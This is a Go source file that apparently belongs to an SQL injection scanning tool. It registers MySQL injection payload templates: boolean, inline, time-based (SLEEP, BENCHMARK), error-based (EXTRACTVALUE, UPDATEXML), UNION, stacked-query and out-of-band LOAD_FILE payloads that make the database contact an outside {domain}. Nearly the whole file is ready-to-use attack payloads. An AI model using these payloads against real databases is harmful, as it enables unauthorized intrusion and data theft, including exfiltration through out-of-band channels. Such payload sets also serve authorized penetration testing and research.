package dbms

func init() {
	register(&Payloads{
		Name: MySQL,
		Boolean: []BoolPair{
			{True: "{orig} AND 1=1", False: "{orig} AND 1=2"},
			{True: "{orig} AND 1=1-- -", False: "{orig} AND 1=2-- -"},
			{True: "{orig}' AND '1'='1", False: "{orig}' AND '1'='2"},
			{True: "{orig}\" AND \"1\"=\"1", False: "{orig}\" AND \"1\"=\"2"},
			{True: "{orig}' AND 'a'='a'-- -", False: "{orig}' AND 'a'='b'-- -"},
			{True: "{orig}' AND ORD(MID(VERSION(),1,1))>51-- -", False: "{orig}' AND ORD(MID(VERSION(),1,1))<52-- -"},
			{True: "{orig}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", False: "{orig}' AND (SELECT 1)=1-- -"},
		},
		Inline: []BoolPair{
			{True: "{orig} AND (SELECT 8634)=(SELECT 8634)", False: "{orig} AND (SELECT 8634)=(SELECT 8635)"},
			{True: "{orig}' AND (SELECT 8634)=(SELECT 8634)-- -", False: "{orig}' AND (SELECT 8634)=(SELECT 8635)-- -"},
			{True: "{orig} AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) IS NOT NULL", False: "{orig} AND (SELECT 1)=2"},
		},
		Time: []TimeTpl{
			{Payload: "{orig}' AND SLEEP({delay})-- -", Risk: 1},
			{Payload: "{orig} AND SLEEP({delay})-- -", Risk: 1},
			{Payload: "{orig}') AND SLEEP({delay})-- -", Risk: 2},
			{Payload: "{orig}' OR SLEEP({delay})-- -", Risk: 2},
			{Payload: "{orig} AND (SELECT * FROM (SELECT SLEEP({delay}))a)-- -", Risk: 2},
			{Payload: "{orig}' AND BENCHMARK(10000000,SHA1('test'))-- -", Risk: 3},
			{Payload: "{orig}' AND BENCHMARK(10000000,MD5(1))-- -", Risk: 3},
		},
		Error: []string{
			"{orig}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT VERSION()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
			"{orig}' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))-- -",
			"{orig}' AND UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE())),1)-- -",
			"{orig}' AND GTID_SUBSET(CONCAT(0x7e,(SELECT VERSION())),1)-- -",
			"{orig}' AND (SELECT 1 FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)-- -",
			"{orig}'",
			"{orig}' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
			"{orig}'",
		},
		Union: UnionTemplates{
			OrderBy: []string{
				"{orig} ORDER BY {n}-- -",
				"{orig}) ORDER BY {n}-- -",
			},
			UnionSelect: []string{
				"{orig} UNION ALL SELECT {cols}-- -",
				"{orig} UNION SELECT {cols}-- -",
				"{orig}) UNION ALL SELECT {cols}-- -",
			},
		},
		Stacked: []TimeTpl{
			{Payload: "{orig}';SELECT SLEEP({delay});-- -", Risk: 2},
			{Payload: "{orig};SELECT SLEEP({delay})-- -", Risk: 2},
		},
		OOB: []string{
			"{orig}' AND LOAD_FILE('\\\\\\\\{domain}\\\\a')-- -",
			"{orig}' AND LOAD_FILE(CONCAT(0x5c5c,'{domain}',0x5c,'{unc}'))-- -",
		},
		StackedOK: true,
	})
}
